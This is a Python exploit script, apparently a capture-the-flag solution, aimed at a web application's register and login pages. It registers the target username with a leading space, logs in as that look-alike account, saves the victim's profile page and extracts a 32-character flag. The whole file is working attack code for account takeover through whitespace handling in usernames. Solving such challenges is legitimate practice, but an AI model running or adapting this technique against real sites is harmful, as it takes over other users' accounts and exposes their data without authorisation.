import argparse
import requests
import re
import sys

class Registrar:
    def __init__(self, baseurl, targetuser):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")

        if not(isinstance(targetuser,str)):
            raise TypeError(f"targetuser must be a string. got {type(targetuser)}")

        self.__baseurl = baseurl
        self.__newuser = f" {targetuser}"
        self.__password = str()
        self.__session = requests.Session()
        return

    def CreateUser(self):
        message = str()
        payload = dict()
        success = bool()

        try:
            self.__password = "password"
            email = "test@test.test"
            targeturl = f"{self.__baseurl}/register.php"

            payload["user"] = self.__newuser
            payload["pass"] = self.__password
            payload["email"] = email
            payload["submit"] = "Register"

            resp = self.__session.post(targeturl, data=payload)
            if resp.status_code >= 400:
                raise ValueError(f"error registering user ({resp.status_code} {resp.reason})")            
            elif "Error: This user is already registered" in resp.text:
                raise ValueError(f"\"{self.__newuser}\" already exists")
            elif "Error:" in resp.text:
                raise ValueError("unknown error occurred")

            message = f"{self.__newuser} successfully created"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def Login(self):
        filename = f"{self.__newuser.strip()}_profile.html"
        message = str()
        payload = dict()
        success = bool()
        targeturl = f"{self.__baseurl}/"

        try:
            payload["user"] = self.__newuser
            payload["pass"] = self.__password

            resp = self.__session.post(targeturl, data=payload)
            if resp.status_code >= 400:
                raise ValueError(f"unable to login ({resp.status_code} {resp.reason})")

            with open(filename,"wb") as fptr:
                fptr.write(resp.content)

            message = f"login successful. content written to \"{filename}\""
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

def FindFlag(filename):
    data = str()
    flag = str()
    matches = list()
    message = str()
    searchpat = "[a-zA-Z0-9]{32}"
    success = bool()

    try:
        if not(isinstance(filename,str)):
            raise TypeError(f"filename must be a string. got {type(filename)}")

        with open(filename, "r") as fptr:
            data = fptr.read()

        reg = re.compile(searchpat)
        matches = reg.findall(data)

        if (matches is None) or (len(matches) < 1):
            raise ValueError(f"\"{searchpat}\" not found in file")

        flag = matches[0]

        message = "flag successfully discovered"
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("address", help="ip address of target", type=str)
    parser.add_argument("username", help="name of user to target", type=str)
    args = parser.parse_args()

    message = str()

    try:
        address = args.address
        if address[-1] == "/":
            address = address[:-1]

        baseurl = f"http://{address}:8088"

        registrar = Registrar(baseurl, args.username)
        success, message = registrar.CreateUser()
        if not(success):
            raise ValueError(message)
        print(f"[+] {message}")

        success, message = registrar.Login()
        if not(success):
            raise ValueError(message)
        print(f"[+] {message}")

        flag, success, message = FindFlag(f"{args.username}_profile.html")
        if not(success):
            raise ValueError(message)
        print(f"[+] Flag: {flag}")

    except Exception as ex:
        print(f"[-] {str(ex)}")
        sys.exit(str(ex))
    return

if __name__ == "__main__":
    main()
